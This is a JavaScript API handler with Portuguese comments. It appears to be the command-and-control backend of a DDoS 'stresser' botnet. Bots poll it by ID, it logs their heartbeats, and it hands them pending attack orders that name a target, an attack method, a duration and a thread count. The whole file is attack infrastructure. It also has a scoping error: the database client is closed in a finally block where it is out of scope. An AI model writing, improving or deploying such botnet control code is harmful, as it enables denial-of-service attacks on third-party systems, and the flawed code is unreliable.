import { MongoClient } from 'mongodb';

const uri = process.env.MONGODB_URI;

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'botId required' });

  try {
    const client = new MongoClient(uri);
    await client.connect();
    const db = client.db('stresser');
    const commands = db.collection('commands');
    const results = db.collection('results');

    // Atualizar heartbeat do bot
    await db.collection('bots').updateOne(
      { botId },
      { $set: { lastSeen: new Date() } }
    );

    // Buscar comando não executado por este bot
    const pendingCommand = await commands.findOne({
      assignedBots: botId,
      completed: { $ne: true }
    });

    if (!pendingCommand) {
      return res.status(200).json({ command: null });
    }

    // Marcar como em andamento (opcional)
    await commands.updateOne(
      { commandId: pendingCommand.commandId },
      { $push: { startedBots: botId } }
    );

    res.status(200).json({
      command: {
        commandId: pendingCommand.commandId,
        target: pendingCommand.target,
        method: pendingCommand.method,
        duration: pendingCommand.duration,
        threads: pendingCommand.threads
      }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  } finally {
    await client.close();
  }
}